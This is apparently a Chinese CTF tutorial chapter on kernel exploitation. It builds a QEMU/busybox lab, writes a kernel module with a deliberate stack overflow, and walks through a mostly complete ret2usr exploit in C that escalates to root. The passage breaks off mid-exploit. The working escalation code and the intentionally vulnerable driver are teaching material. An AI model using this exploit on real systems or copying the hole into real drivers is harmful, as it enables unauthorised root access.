---
chapter: PWN
section: Kernel PWN 入门
order: 318
tags:
  - CTF
  - PWN
  - Kernel
publish: true
---

# P18 Kernel PWN 入门
## Kernel PWN Introduction

> [!info]- 章节信息
> **所属方向**：PWN ｜ **难度阶段**：L4 高级与实战期 ｜ **前置要求**：[[P07-ret2libc-ret2syscall-ret2shellcode|P7]] · [[P08-ROP进阶与SROP|P8]] · [[P04-Linux安全缓解机制|P4]]
> **本章目标**：把 kernel pwn 的题目形态、本地环境搭建、漏洞模块编写与提权利用一次讲全：从零拼一个最小 Linux 环境（自取内核镜像、自做 initramfs、QEMU 启动），写一个带内核栈溢出的字符设备模块，走通 ret2usr 提权拿到 root shell，再看 SMEP/KPTI 开启后的 Kernel ROP 路线与 modprobe_path 覆盖打法——完成一道基础 kernel pwn 的全部环节。

## 1. Kernel PWN 是什么：题目形态与用户态 PWN 的差异

[[P01-PWN导论与缓解机制全景|P1]] 第 1 节给用户态 PWN 题画过像：一个带漏洞的二进制加一个 `nc` 服务，getshell 或读 flag。kernel pwn 把靶子从"一个进程"换成了"整个操作系统内核"：目标程序变成一个加载进内核的模块，漏洞触发时执行流已经处于内核态（ring 0），而 flag 通常只有 root 能读——所以内核题的目标是==提权==：让当前进程的凭据变成 root，再回用户态读 flag。

一道 kernel pwn 题的标准附件是"三件套加一个模块"：

| 附件 | 是什么 | 对应本章哪里 |
| ---- | ---- | ---- |
| `bzImage` | 压缩过的 Linux 内核镜像，虚拟机的"操作系统本体" | 第 2 节 |
| `rootfs.cpio`（或 `rootfs.cpio.gz`） | 打包成 cpio 归档的根文件系统，里面有 init 脚本、busybox、flag | 第 3 节 |
| `run.sh` | 启动脚本，一行 `qemu-system-x86_64 ...`，参数已经替你写好 | 第 3 节 |
| `*.ko`（可能单独给，也可能已打包进 rootfs） | 出题人写的漏洞内核模块，漏洞就在它里面 | 第 4 节 |

与用户态 PWN 的本质差异，一张表说清：

| | 用户态 PWN（P1–P17） | Kernel PWN（本章） |
| ---- | ---- | ---- |
| 打的对象 | 一个进程，出了事进程自己死 | 内核本体，出了事==全机 panic== |
| 目标 | getshell / 读 flag | 提权（进程凭据变 root）→ 读 flag |
| 漏洞载体 | ELF 程序的 `gets`/`read` 等 | 内核模块的 `copy_from_user`/`get_user` 等 |
| 溢出的栈 | 进程的用户态栈（8 MB 量级） | 内核栈（每线程独立，默认 16 KiB） |
| libc 的角色 | 利用的大本营（[[P07-ret2libc-ret2syscall-ret2shellcode\|P7]]） | 不存在——内核自己就是"libc"，函数地址即符号表条目 |
| 调试 | gdb 直接起进程（[[P05-pwntools与GDB插件工具链\|P5]]） | gdb 连 QEMU 暴露的调试桩（3.2 折叠框） |

> [!warning] 内核态崩溃没有"收尾崩溃不影响结果"
> [[P01-PWN导论与缓解机制全景|P1]] 的 ret2win 里，flag 打出来之后程序崩溃无所谓。内核里没有这层缓冲：控制流跳错一个地址，轻则 oops（当前线程被杀，机器还活着），重则 panic（整台虚拟机死机，shell 都没了）。写内核 exploit 比用户态更讲究"干净返回"，本章的每条链都会回到这个话题。

> [!info]- 难度定位：为什么 kernel pwn 排在堆利用之后
> 内核题的漏洞形态本身不新——本章的栈溢出与 [[P06-栈溢出原理与ret2win|P6]] 同源。新增的成本在三层：环境（内核镜像、根文件系统、QEMU 参数，一套都要自己拼）、符号与布局（内核没有 libc 可泄露，符号地址从内核镜像里读）、缓解机制（SMEP/SMAP/KPTI 这组只在"内核"这个角色上才存在的机制，[[P04-Linux安全缓解机制|P4]] 没有展开）。把环境一次搭好之后，第 5 节会看到熟悉的动作反复出现。

## 2. 环境搭建（一）：内核镜像与未压缩 vmlinux

搭建分三步：取内核镜像、做根文件系统、QEMU 启动。本节是第一步。

### 2.1 取一份 bzImage

发行版的内核包把成品 `vmlinuz`（就是 bzImage，两种叫法指同一类文件）装到 `/boot`。Debian/Ubuntu 上装 `linux-image-virtual` 一族即可（镜像较大，安装需要一点时间）：

```bash
sudo apt install linux-image-virtual linux-headers-virtual
apt-get download linux-image-virtual        # 只想看看包内容时可以先下载
```

输出：

```
Get:1 http://archive.ubuntu.com/ubuntu resolute-updates/main amd64 linux-image-virtual amd64 7.0.0-38.38 [2346 B]
Fetched 2346 B in 2s (1239 B/s)
```

注意 `linux-image-virtual` 本体只有 2 KB——它是个元包，真正的镜像由它拉进来的 `linux-image-<版本号>` 包提供，装好后落在 `/boot`。把版本对应的 `vmlinuz` 拷出来当 bzImage：

```bash
cp /boot/vmlinuz-7.0.0-38-generic bzImage
file bzImage
```

输出：

```
bzImage: Linux kernel x86 boot executable, bzImage, version 7.0.0-38-generic (buildd@lcy02-amd64-070) #38-Ubuntu SMP PREEMPT_DYNAMIC Fri Sep  4 09:10:14 UTC 2026, RO-rootFS, Normal VGA, setup size 512*39, syssize 0x107f20, jump 0x26c 0x8cd88ec0fc8cd239 instruction, protocol 2.15, from protected-mode code at offset 0x2cc 0x10456ea bytes ZST compressed, relocatable, handover offset 0x1072530, legacy 64-bit entry point, can be above 4G, 32-bit EFI handoff entry point, 64-bit EFI handoff entry point, EFI kexec boot support, xloadflags bit 5, max cmdline size 2047, init_size 0x44c1000
```

file 的输出把关键信息都报了：这是一份==ZSTD 压缩==的 x86 内核镜像。压缩意味着 2.2 节要解一道手续；同时也意味着它不能直接给 objdump 用。

### 2.2 extract-vmlinux：从 bzImage 里解出未压缩内核

分析符号、搜 gadget 都需要==未压缩的 vmlinux==。bzImage 的布局是"一段 setup 代码 + 一块压缩流"，解压逻辑在内核源码的 `scripts/extract-vmlinux` 里：在镜像里找压缩流魔数，从魔数处开始喂给对应解压器，输出以 ELF 魔数（`\x7fELF`）开头的那份就是未压缩内核。自己实现一份很短：

```python
#!/usr/bin/env python3
# extract_vmlinux.py —— 从 bzImage 里解出未压缩的 vmlinux
import re
import subprocess
import sys

MAGICS = [
    (b'\x1f\x8b\x08',     ['gzip', '-d']),
    (b'\xfd7zXZ\x00',     ['xz', '-d']),
    (b'BZh',              ['bzip2', '-d']),
    (b'\x5d\x00\x00',     ['xz', '--format=lzma', '-d']),
    (b'\x89LZO',          ['lzop', '-d']),
    (b'\x02!L\x18',       ['lz4', '-d']),
    (b'\x28\xb5\x2f\xfd', ['zstd', '-d']),
]

data = open(sys.argv[1], 'rb').read()
print('image size: %d bytes' % len(data))
for magic, cmd in MAGICS:
    for m in re.finditer(re.escape(magic), data):
        p = subprocess.run(cmd, input=data[m.start():], capture_output=True)
        out = p.stdout
        if out[:4] == b'\x7fELF':
            open(sys.argv[2], 'wb').write(out)
            print('%s stream found at offset 0x%x, vmlinux %d bytes -> %s'
                  % (cmd[0], m.start(), len(out), sys.argv[2]))
            sys.exit(0)
print('no compressed ELF found')
sys.exit(1)
```

```bash
python3 extract_vmlinux.py bzImage vmlinux
file vmlinux
```

输出：

```
image size: 17320328 bytes
zstd stream found at offset 0x52cc, vmlinux 71005544 bytes -> vmlinux
vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=338e542e384c46228f7a378babc0f9bb2b6a5997, stripped
```

2.1 里 file 报的 "ZST compressed" 在这里对上了：zstd 流从偏移 0x52cc 开始，解出 71 MB 的 ELF。最后那个 `stripped` 值得单独一句——发行版的 vmlinux 是删了符号表的，`nm` 会直接拒绝：

```bash
nm vmlinux | grep -w commit_creds
```

输出：

```
nm: vmlinux: no symbols
```

### 2.3 符号从哪来：System.map

解出的 vmlinux 没有符号表，但内核符号地址不缺来源——发行版随镜像一起装了一份 ==System.map==（`/boot/System.map-<版本>`），格式是"地址 类型 符号名"的纯文本表，需要的符号一行 grep：

```bash
grep -E ' (commit_creds|prepare_kernel_cred|init_task|modprobe_path)$' /boot/System.map-7.0.0-38-generic
```

输出：

```
ffffffff8148a7e0 T commit_creds
ffffffff8148ae30 T prepare_kernel_cred
ffffffff83a134c0 T init_task
ffffffff83c20560 T modprobe_path
```

这四个符号覆盖本章两条利用路线的全部需求：`commit_creds` 与 `prepare_kernel_cred` 是提权要调用的内核函数（5.1），`init_task` 是 6.2 之后 `prepare_kernel_cred` 的新参数（同节），`modprobe_path` 是第 8 节要改写的目标。vmlinux 本身仍然有用——它是字节级反汇编与 gadget 搜索的原料（6.2），只是不带名字。

> [!info]- kallsyms 与 System.map 是什么关系
> 运行中的内核把同一张符号表挂在 `/proc/kallsyms`，格式与 System.map 相同。运行期它受 `kptr_restrict` 控制：默认配置下普通用户读到的地址全是 0（5.5 与折叠框）。做题时的分工：==符号地址从题目附件的 System.map（或 vmlinux-to-elf 这类工具恢复的符号表）读==；qemu 里以 root 身份 `cat /proc/kallsyms` 做对账。本机内核启动 cmdline 带 `nokaslr`（3.2），两边数值逐位一致，5.5 会对一次账。

## 3. 环境搭建（二）：busybox 根文件系统与 QEMU 启动

### 3.1 手工 initramfs：最小根文件系统

内核启动后要执行的第 1 个程序是 initramfs 里的 `/init`。题目附件的 rootfs.cpio 就是这么一个打包好的根文件系统；自己拼一个最小版只需要 busybox 和一个 init 脚本：

```bash
mkdir -p rootfs/{bin,sbin,etc,proc,sys,dev,tmp,home/ctf}
chmod 1777 rootfs/tmp
cp /bin/busybox rootfs/bin/
mknod -m 622 rootfs/dev/console c 5 1     # init 的标准输出要落在它上面
cp init rootfs/init && chmod 755 rootfs/init
cp vulndev.ko rootfs/                     # 第 4 节编出的漏洞模块
cp exp_ret2usr exp_modprobe trigger drop rootfs/home/ctf/
chmod 755 rootfs/home/ctf/*
(cd rootfs && find . | cpio -o -H newc --owner root:root | gzip -9) > rootfs.cpio.gz
ls -l rootfs.cpio.gz
```

输出：

```
-rw-r--r-- 1 root root 2813725 Oct 23 11:48 rootfs.cpio.gz
```

逐项说明：busybox 需要是==静态链接==版（`file /bin/busybox` 确认 `statically linked`，发行版的 busybox-static 包提供它），因为 initramfs 里没有动态链接器；`/dev/console` 节点必须手工 mknod——内核执行 `/init` 之前会把它的标准输入输出接在这个节点上，缺了它 init 的输出全部落空；`--owner root:root` 让包内文件属主统一为 root，不随打包者变。init 脚本全文：

```sh
#!/bin/busybox sh
# init —— initramfs 的 1 号进程
/bin/busybox --install -s /bin
export PATH=/bin:/sbin

mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev
mkdir -p /tmp /home/ctf

# 教学环境放开两处限制：普通用户也能读内核符号表、看 dmesg
echo 0 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/perf_event_paranoid
echo 0 > /proc/sys/kernel/dmesg_restrict
dmesg -n 7

echo 'flag{p18_kernel_pwn_first_blood}' > /flag.txt
chmod 600 /flag.txt

echo 'root:x:0:0:root:/root:/bin/sh' > /etc/passwd
echo 'ctf:x:1000:1000:ctf:/home/ctf:/bin/sh' >> /etc/passwd
echo 'root:x:0:'  > /etc/group
echo 'ctf:x:1000:' >> /etc/group

echo
echo '### boot done ###'
setsid cttyhack sh
poweroff -f
```

两个设计各有用处。其一，==flag 权限 600，shell 却降权到 uid 1000==：busybox 的 init 直接跑就是 root，"提权"就无从谈起；所以 init 备好一个 `drop` 辅助程序（`setuid(1000)` 后 `execv` 给定程序），演示时先用它降权，利用成功前后 `cat /flag.txt` 的两种结局对照才成立。其二，放开 `kptr_restrict` 与 `perf_event_paranoid` 两个开关，普通用户才能从 `/proc/kallsyms` 读到真实符号地址（5.5）——这是教学环境的设定，真题里没有这种便利。

### 3.2 启动脚本逐参数解释

题目附件的 `run.sh` 通常长这样（本章环境同一套）：

```bash
#!/bin/bash
qemu-system-x86_64 \
    -m 512M \
    -kernel bzImage \
    -initrd rootfs.cpio.gz \
    -append "console=ttyS0 nokaslr nopti" \
    -cpu qemu64 \
    -nographic \
    -no-reboot
```

每个参数都在决定利用的边界，逐个过：

| 参数 | 作用 | 与利用的关系 |
| ---- | ---- | ---- |
| `-kernel bzImage` | 把内核镜像加载为引导内核 | 题目给哪份就分析哪份，符号从它来 |
| `-initrd rootfs.cpio.gz` | 挂上根文件系统 | 附件里常带现成的，第 4 节的模块要塞进去时按 3.1 重新打包 |
| `-append "..."` | 内核命令行 | `console=ttyS0` 把控制台接到串口（配 `-nographic` 才能在终端里看到 shell）；`nokaslr` 关内核基址随机化；`nopti` 关 KPTI |
| `-cpu qemu64` | CPU 型号 | ==qemu64 默认不带 SMEP/SMAP==，ret2usr 的前提；加号开关可逐位打开：`-cpu qemu64,+smep,+smap`，5.4 的对照组就是这一行 |
| `-m 512M` | 内存大小 | 真题给多少用多少，改小可能起不来 |
| `-nographic` | 不开图形窗口，串口接标准输入输出 | 题目环境的标配；`-serial file:xxx.log` 可以把串口输出重定向进文件，方便留档 |
| `-no-reboot` | 宕机不停机重启 | panic 后直接停在原地，dmesg 才看得全 |

三个常在附件 `run.sh` 里见到、本章环境用不到的参数放折叠框。

> [!info]- gdb 桩、文件共享与加速
> - `-s` 在 TCP 1234 端口开 GDB 调试桩（等价于 `-gdb tcp::1234`），宿主机 `gdb ./vmlinux -ex 'target remote :1234'` 即可断在内核符号上；配 `-S` 让内核先不跑，等 gdb 连上再 `continue`。这是内核态等价的"[[P05-pwntools与GDB插件工具链|P5]] 联动调试"。
> - `-fsdev local,...,security_model=none,id=fs0 -device virtio-9p-pci,fsdev=fs0,mount_tag=hostshare`（配 `-virtfs` 简写）是 9p 文件共享，老题用它在宿主机与虚拟机之间传文件；新版用 scp 类方案或干脆把文件打进 rootfs。
> - `-enable-kvm` 走 KVM 加速，启动从几十秒缩到一两秒；WSL 或无嵌套虚拟化的环境里没有 `/dev/kvm`，退回纯模拟（TCG）照常能用，只是慢。
> - 附件 run.sh 里见到 `-L`（指定 BIOS/固件目录）时照抄即可，不影响利用思路。

### 3.3 启动，进 shell

```bash
./run.sh
```

输出（启动日志尾部，内核解压、初始化之后进入 init 脚本）：

```
[    2.039098] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    2.039349] Run /init as init process

### boot done ###


BusyBox v1.37.0 (Ubuntu 1:1.37.0-7ubuntu1) built-in shell (ash)
Enter 'help' for a list of built-in commands.

~ # uname -a
Linux (none) 7.0.0-38-generic #38-Ubuntu SMP PREEMPT_DYNAMIC Fri Sep  4 09:10:14 UTC 2026 x86_64 GNU/Linux
~ # id
uid=0(root) gid=0(root)
~ #
```

一个能在终端里敲命令的 Linux 就绪了。这套"bzImage + rootfs.cpio.gz + run.sh"与真题附件完全同构，后面所有演示都在它里面进行。

## 4. 内核模块与漏洞模块

### 4.1 模块机制三十秒

Linux 的驱动可以编成==可加载模块==（`.ko`），运行期用 `insmod` 装进内核、`rmmod` 卸下。模块的核心是一张 ==file_operations 结构==——函数指针表，声明这个模块被打开、读、写时分别调用哪些函数；[[P06-栈溢出原理与ret2win|P6]] 的 `win` 函数地址、[[P07-ret2libc-ret2syscall-ret2shellcode|P7]] 的 GOT 表项，在内核题里的对应物就是这张表里的函数指针。用 misc 杂项设备注册最省事：主设备号固定 10，注册后自动出现 `/dev/<名字>` 节点。

装模块有一条硬约束：==模块与内核必须版本同源==。编译时模块头部写进了 vermagic 字符串（版本号加编译选项摘要），内核加载时逐字比对，不一致直接拒绝，报 `Invalid module format`。所以==编译模块用的 linux-headers 必须与要启动的 bzImage 是同一份包==：

```bash
sudo apt install linux-headers-7.0.0-38-generic    # 版本号与 bzImage 一致
ls /lib/modules/7.0.0-38-generic/build             # 头文件目录，make 的 KDIR 指这里
```

> [!info]- 签名与 taint：装上无签名模块会发生什么
> Ubuntu 内核开了 `CONFIG_MODULE_SIG`（模块签名）但没开强制，无签名模块能装，代价是两条内核日志：`loading out-of-tree module taints kernel` 与 `module verification failed: signature and/or required key missing`，此后内核标志位带上 `[O]=OOT_MODULE, [E]=UNSIGNED_MODULE`（4.4 的输出可见）。不影响利用。若题目内核开了 `CONFIG_MODULE_SIG_FORCE`，无签名模块一律拒装，出题方会随附件提供签名或干脆关掉这个选项——遇到 `Required key not available` 的拒绝先往这里想。

### 4.2 写漏洞模块：从 copy_from_user 到 get_user 循环

第一版很自然：read 入口把用户数据 `copy_from_user` 进一个 64 字节的内核栈缓冲区，长度不设防。

```c
static noinline void do_copy(char *dst, const char __user *src, size_t n)
{
	copy_from_user(dst, src, n);
}

static ssize_t vuln_read(struct file *filp, char __user *ubuf,
			 size_t count, loff_t *ppos)
{
	char kbuf[64];

	pr_info("vulndev: read called, count=%zu\n", count);
	do_copy(kbuf, ubuf, count);
	pr_info("vulndev: read done\n");
	return count;
}
```

装进模块、启动虚拟机、读一下设备（`count` 超过 64 就该溢出），内核给出的回答是：

```
[   48.936224] vulndev: read called, count=104
[   48.936317] usercopy: Kernel memory overwrite attempt detected to process stack (offset 18446744073709551528, size 104)!
[   48.936562] kernel BUG at mm/usercopy.c:102!
```

`CONFIG_HARDENED_USERCOPY`（Ubuntu 默认开，`/boot/config-*` 里可查）在运行期检查每次成块的内核侧拷贝目标：目标在内核栈上、又超出帧边界，当场 `BUG` 拦下——漏洞在触发之前就被防御机制吃掉了。逐字节的 `get_user` 不经过这道检查，把搬运改成循环即可（"长度没卡的逐字节搬运"也是真实驱动里出现过的漏洞形态）：

```c
/* vulndev.c —— 教学用漏洞内核模块（x86-64 Linux）
 * read 入口把用户数据逐字节搬进 64 字节的内核栈缓冲区 kbuf，
 * 循环上界就是用户给的 count，没有做任何限制，构成内核栈溢出。
 * 注册成 misc 字符设备，加载后出现 /dev/vulndev。 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>

static noinline void fill_buf(char *kbuf, const char __user *ubuf, size_t count)
{
	size_t i;

	for (i = 0; i < count; i++)
		get_user(kbuf[i], ubuf + i);
}

static ssize_t vuln_read(struct file *filp, char __user *ubuf,
			 size_t count, loff_t *ppos)
{
	char kbuf[64];

	pr_info("vulndev: read called, count=%zu\n", count);
	fill_buf(kbuf, ubuf, count);
	pr_info("vulndev: read done, kbuf[0]=%02x\n", kbuf[0]);
	return count;
}

static const struct file_operations vuln_fops = {
	.owner = THIS_MODULE,
	.read  = vuln_read,
};

static struct miscdevice vuln_misc = {
	.minor = MISC_DYNAMIC_MINOR,
	.name  = "vulndev",
	.fops  = &vuln_fops,
	.mode  = 0666,
};

static int __init vulndev_init(void)
{
	return misc_register(&vuln_misc);
}

static void __exit vulndev_exit(void)
{
	misc_deregister(&vuln_misc);
}

module_init(vulndev_init);
module_exit(vulndev_exit);
MODULE_LICENSE("GPL");
```

循环包进 ==noinline== 的辅助函数不是装饰，两处都踩过：

> [!warning] 优化器会把"没人读的缓冲区"连同漏洞一起删掉
> 把循环直接写在 `vuln_read` 里、用 `-O2`（内核构建强制开优化，`-O0` 连内联汇编都过不了）编译，反汇编出来的循环==没有任何一条写 kbuf 的指令==——只有一次 `call __get_user_1`（读用户字节）和一次 `call __ubsan_handle_out_of_bounds`（UBSAN 的数组下标插桩）：kbuf 只写不读，编译器把死存储全部消掉了，"溢出"根本不存在。对策两条：循环放进 `noinline` 函数，指针参数没有定长信息，死存储消除与 UBSAN 下标插桩都失效；缓冲区事后读一格（`kbuf[0]`）保活。同样地，内核默认的栈金丝雀（`CONFIG_STACKPROTECTOR_STRONG=y`）要在编译模块时显式关掉，否则覆盖返回地址之前先撞上自己的哨兵——出题方编译漏洞模块时的常见选择就是 `-fno-stack-protector`。

### 4.3 编译与量偏移

内核模块的 Makefile 只有两行实质内容：

```make
obj-m := vulndev.o

ccflags-y := -O2 -fno-stack-protector -fno-omit-frame-pointer

all:
	$(MAKE) -C $(KDIR) M=$(CURDIR) modules

clean:
	$(MAKE) -C $(KDIR) M=$(CURDIR) clean
```

```bash
make KDIR=/lib/modules/7.0.0-38-generic/build
modinfo vulndev.ko | grep -E '^(vermagic|license)'
```

输出：

```
  LD [M]  vulndev.ko
license:        GPL
vermagic:       7.0.0-38-generic SMP preempt mod_unload modversions
```

vermagic 与 3.3 启动的内核逐字一致，`insmod` 才放行（4.1）。`-fno-omit-frame-pointer` 保留帧指针，让栈布局可以用 rbp 相对偏移直接读出来——量偏移的动作与 [[P06-栈溢出原理与ret2win|P6]] 第 2 节同一套，只是这次量的是模块自身的反汇编：

```bash
objdump -d -M intel vulndev.ko | sed -n '/<vuln_read>:/,/^$/p'
```

输出：

```asm
; x86-64 Linux / System V AMD64 ABI
0000000000000080 <vuln_read>:
  80:	e8 00 00 00 00       	call   85 <vuln_read+0x5>
  85:	55                   	push   rbp
  86:	31 c0                	xor    eax,eax
  88:	b9 10 00 00 00       	mov    ecx,0x10
  8d:	48 89 e5             	mov    rbp,rsp
  90:	41 55                	push   r13
  92:	49 89 f5             	mov    r13,rsi
  95:	48 89 d6             	mov    rsi,rdx
  98:	41 54                	push   r12
  9a:	48 8d 7d a8          	lea    rdi,[rbp-0x58]
  9e:	53                   	push   rbx
  9f:	48 89 d3             	mov    rbx,rdx
  a2:	48 83 ec 40          	sub    rsp,0x40
  a6:	f3 ab                	rep stos DWORD PTR [rdi],eax
  a8:	48 c7 c7 00 00 00 00 	mov    rdi,0x0
  af:	e8 00 00 00 00       	call   b4 <vuln_read+0x34>
  b4:	48 89 da             	mov    rdx,rbx
  b7:	4c 89 ee             	mov    rsi,r13
  ba:	48 8d 7d a8          	lea    rdi,[rbp-0x58]
  be:	e8 4d ff ff ff       	call   10 <fill_buf>
  c3:	0f b6 75 a8          	movzx  esi,BYTE PTR [rbp-0x58]
  c7:	48 c7 c7 00 00 00 00 	mov    rdi,0x0
  ce:	e8 00 00 00 00       	call   d3 <vuln_read+0x53>
  d3:	48 89 d8             	mov    rax,rbx
  d6:	48 83 c4 40          	add    rsp,0x40
  da:	5b                   	pop    rbx
  db:	41 5c                	pop    r12
  dd:	41 5d                	pop    r13
  df:	5d                   	pop    rbp
  e8:	e9 00 00 00 00       	jmp    ed <vuln_fops+0x4d>
```

三样东西各归各位：`kbuf` 在 `rbp-0x58`（0x9a 的 `lea` 与 0xc3 的 `movzx` 同一个地址）；尾声一串 `pop` 之后经 `jmp` 跳进返回桩（内核的 Spectre 缓解把裸 `ret` 换成了跳转，运行期按需改写，对利用者而言==等价于一条 ret==，弹的仍是 `rbp+0x8` 的返回地址槽）；返回地址槽在 `rbp+0x8`。于是从 `kbuf` 到返回地址的距离：

$$\text{offset} = (0x58 + 0x8) - 0 = 0x60 = 96 \tag{18.1}$$

==payload 的第 96 字节起写 8 字节返回地址==，前 96 字节填满 `kbuf` 区与保存的 rbp。

### 4.4 装进内核：insmod 与无害触发

回到虚拟机（模块已按 3.1 打进 rootfs），root shell 里加载并触发一次无害读写：

```
~ # insmod /vulndev.ko
[   52.253729] vulndev: loading out-of-tree module taints kernel.
[   52.253981] vulndev: module verification failed: signature and/or required key missing - tainting kernel
[   52.258905] vulndev: loaded (misc major 10)
~ # ls -l /dev/vulndev
crw-rw-rw-    1 root     root       10, 262 Oct 23 03:49 /dev/vulndev
~ # busybox dd if=/dev/vulndev bs=64 count=1 2>/dev/null
[   56.898466] vulndev: read called, count=64
[   56.898554] vulndev: read done, kbuf[0]=00
```

三条日志各对应一个环节：taint 两条是 4.1 折叠框的无签名模块代价；`/dev/vulndev` 自动出现（misc 注册的福利，权限 0666 来自模块代码，普通用户也能打开）；`dd bs=64` 让内核以 `count=64` 调用一次 `vuln_read`，恰好填满 `kbuf`、不越界——两条 `pr_info` 都打出来了。

> [!warning] 无害触发也别把 count 开大
> 内核栈每线程只有 16 KiB（`THREAD_SIZE`）。`count` 若放任到 65536（`cat` 的缓冲区大小），逐字节循环会一路写穿整个内核栈，撞上栈末尾的未映射页：
>
> ```
> [   55.535754] vulndev: read called, count=65536
> [   55.536619] BUG: unable to handle page fault for address: ffffc90000218000
> [   55.536729] #PF: supervisor write access in kernel mode
> [   55.536776] #PF: error_code(0x0002) - not-present page
> [   55.537183] Oops: Oops: 0002 [#1] SMP NOPTI
> [   55.537901] RIP: 0010:fill_buf+0x34/0x60 [vulndev]
> ```
>
> 溢出写要精确控制在"返回地址槽附近"，多出去的字节全是事故。

## 5. 提权原理与第一次 kernel getshell

### 5.1 cred：内核里的"我是谁"

内核用 ==struct cred== 描述一个线程的凭据：uid/gid、各个 capability、所属组……权限检查查的就是它。改凭据的标准动作是一对函数：

```c
commit_creds(prepare_kernel_cred(0));
```

`prepare_kernel_cred` 以某个内核线程的凭据为模板复制一份全 root 的 `cred`，`commit_creds` 把它装到当前线程上——==从这条语句之后，当前进程就是 root==。两件事要注意。

其一，==这条经典写法有版本前提==。上游内核 6.2 起改掉了 `prepare_kernel_cred` 的约定：传 `NULL`（老写法的"0"）会触发 WARN 并返回 `NULL`，`commit_creds(NULL)` 随之完蛋。新写法传 `init_task` 的地址（0 号进程的 task_struct，符号表必有），以它为模板：

```c
commit_creds(prepare_kernel_cred(&init_task));
```

本机内核是 7.0，演示代码全部用新写法；做老内核的题（5.x）遇到 `commit_creds(prepare_kernel_cred(0))` 不用惊讶，那是同一件事的历史形态。还有一个更省符号的变体：`commit_creds(&init_cred)` 直接把启动时的全 root 凭据常量装上去，6.3 的链草图用的就是它。

其二，==改的是当前线程==。提权发生在哪个进程里，哪个进程变 root——所以 exploit 提权后通常直接 `execve("/bin/sh")`，把 root shell 交到手里。

### 5.2 ret2usr：让内核执行用户态的函数

漏洞能覆盖内核栈上的返回地址，接下来跳去哪？用户态 PWN 的答案（`win`、ROP 链）在内核题里有个更省事的版本：==跳回用户态自己的函数==。SMEP/SMAP 关闭时（`-cpu qemu64` 默认如此，3.2 的表格），内核态可以执行用户页上的代码、访问用户页上的数据——返回地址槽里写一个用户态函数 `escalate` 的地址，`vuln_read` 的 ret 一弹，CPU 就在 ring 0 上执行用户页里的提权代码。

写 exploit 前先解决三个技术点：

- **怎么回用户态**。`escalate` 不能走正常函数返回——它"压上来的返回地址"是内核栈上的 payload 残渣。标准做法是手工构造一次==中断返回==：`iretq` 按栈上的 5 连槽依次恢复 rip、cs、rflags、rsp、ss。触发前先把用户态现场存好（cs、ss、rflags、rsp 四个值），提权完 `swapgs`（换回用户态的 GS 基址，否则回用户态后的第一次系统调用会把 GS 又换错）再 `iretq` 落回用户态指定位置。
- **符号地址**。`commit_creds`、`prepare_kernel_cred`、`init_task` 的地址从 `/proc/kallsyms` 读（教学环境 init 已放开；真题按附件的 System.map 写死，KASLR 开启时先泄露，5.5、第 6 节）。
- **落点的栈对齐**。iretq 恢复的 rsp 若不满足函数入口约定（≡8 mod 16），静态 glibc 里 `movaps` 一类的 16 字节访存指令当场 GPF——[[P06-栈溢出原理与ret2win#5. 栈 16 字节对齐与 movaps 崩溃|P6 第 5 节]]的对齐问题在 iretq 落点上原样重演。构造 iretq 帧时把 rsp 拨回约定值即可。

exploit 全文：

```c
/* exp_ret2usr.c —— ret2usr 提权演示（x86-64 Linux）
 * 运行前提（教学环境）：qemu64 CPU（SMEP/SMAP 关），cmdline 带 nokaslr nopti，
 * vulndev.ko 已加载，/proc/kallsyms 可读。 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define OFFSET 96            /* 反汇编量得 kbuf 在 rbp-0x58：从 kbuf 到 rbp+0x8 的
                              * 返回地址是 0x60 = 96 字节，数值以模块反汇编为准 */

static unsigned long user_cs, user_ss, user_rflags, user_sp;
static unsigned long commit_creds_addr, prepare_kernel_cred_addr, init_task_addr;

/* 伪造的 iretq 帧：依次为 rip / cs / rflags / rsp / ss */
static unsigned long iret_frame[5];

static void save_state(void)
{
    __asm__ __volatile__(
        "movq %%cs,  %0\n\t"
        "movq %%ss,  %1\n\t"
        "pushfq\n\t"
        "popq  %2\n\t"
        "movq %%rsp, %3\n\t"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
        :
        : "memory");
}

/* 回到用户态后的落点：此刻整个进程已经是 root，直接换壳成 shell */
static void win_land(void)
{
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };

    printf("[+] back in userland: uid=%d gid=%d\n", getuid(), getgid());
    execve("/bin/sh", argv, envp);
    perror("[-] execve");
    exit(1);
}

/* 被 vuln_read 的 ret 调入：此刻 CPU 在 ring0、栈是内核栈 */
static void escalate(void)
{
    ((void (*)(unsigned long))commit_creds_addr)(
        ((unsigned long (*)(unsigned long))prepare_kernel_cred_addr)(init_task_addr));
    __asm__ __volatile__(
        "swapgs\n\t"
        "movq %0, %%rsp\n\t"
        "iretq\n\t"
        :
        : "r"(iret_frame)
        : "memory");
    for (;;)             /* iretq 不返回，这里只是兜底 */
        ;
}

static unsigned long ksym(const char *name)
{
    FILE *fp;
    char line[512], sym[128], type;
    unsigned long addr = 0;

    fp = fopen("/proc/kallsyms", "r");
    if (!fp) {
        perror("[-] open /proc/kallsyms");
        exit(1);
    }
    while (fgets(line, sizeof(line), fp)) {
        if (sscanf(line, "%lx %c %127s", &addr, &type, sym) == 3 &&
            strcmp(sym, name) == 0)
            break;
    }
    fclose(fp);
    return addr;
}

int main(void)
{
    unsigned char payload[OFFSET + 8];
    int fd;

    setvbuf(stdout, NULL, _IONBF, 0);
    save_state();

    commit_creds_addr        = ksym("commit_creds");
    prepare_kernel_cred_addr = ksym("prepare_kernel_cred");
    init_task_addr           = ksym("init_task");
    if (!commit_creds_addr || !prepare_kernel_cred_addr || !init_task_addr) {
        printf("[-] kallsyms unreadable or symbols hidden\n");
        return 1;
    }

    iret_frame[0] = (unsigned long)win_land;
    iret_frame[1] = user_cs;
    iret_frame[2] = user_rflags;
    /* 落点 rsp 拨到函数入口约定（rsp ≡ 8 mod 16）：用户态栈题里的对齐
     * 问题在 iretq 落点上原样出现，不摆正，win_land 里的 movaps 会当场 GPF */
    iret_frame[3] = (user_sp & ~0xfUL) - 8;
    iret_frame[4] = user_ss;

    memset(payload, 'A', sizeof(payload));
